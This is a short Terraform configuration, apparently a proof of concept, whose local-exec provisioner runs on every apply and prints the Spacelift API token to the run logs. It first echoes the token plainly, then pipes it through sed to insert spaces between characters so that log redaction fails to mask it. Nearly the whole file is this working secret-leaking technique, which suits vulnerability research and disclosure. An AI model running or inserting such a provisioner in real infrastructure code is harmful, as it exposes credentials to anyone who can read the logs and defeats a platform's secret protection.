resource "null_resource" "log_redaction_bypass" {
  triggers = {
    always_run = "${timestamp()}"
  }

  provisioner "local-exec" {
    command = <<EOT
      echo "=== START PoC: Log Redaction Bypass ==="

      # Standard echo (Should be redacted by Spacelift)
      echo "[*] Standard Echo:"
      echo "$SPACELIFT_API_TOKEN"

      # Bypass Method: String Splitting
      # Inserting spaces breaks the pattern matching, allowing the secret to leak.
      echo "[*] Exfiltration via Splitting:"
      echo "$SPACELIFT_API_TOKEN" | sed 's/./& /g'

      echo "=== END PoC ==="
    EOT
  }
}
